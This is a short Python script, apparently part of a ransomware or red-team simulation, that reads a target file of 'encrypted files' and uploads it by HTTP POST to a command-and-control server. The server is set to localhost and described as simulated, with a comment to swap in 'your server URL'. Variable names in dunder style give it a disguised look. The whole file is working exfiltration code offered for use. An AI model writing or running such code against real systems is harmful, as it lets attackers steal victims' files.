import requests as req
import os as o

# URL of the simulated C2 server (Python http.server or cloud bucket)
__C2__ = 'http://127.0.0.1:8000/upload'  # Change to your server URL

# Path to the encrypted folder/file
__ENC__ = 'path/to/encrypted/files.log'

def __EXFIL__(__FILE__):
    with open(__FILE__, 'rb') as __F__:
        __FILES__ = {'file': (o.path.basename(__FILE__), __F__)}
        __RESP__ = req.post(__C2__, files=__FILES__)
        
    if __RESP__.status_code == 200:
        print(f"File {__FILE__} successfully exfiltrated.")
    else:
        print(f"Failed to exfiltrate {__FILE__}. Status code: {__RESP__.status_code}")

# Call the function
__EXFIL__(__ENC__)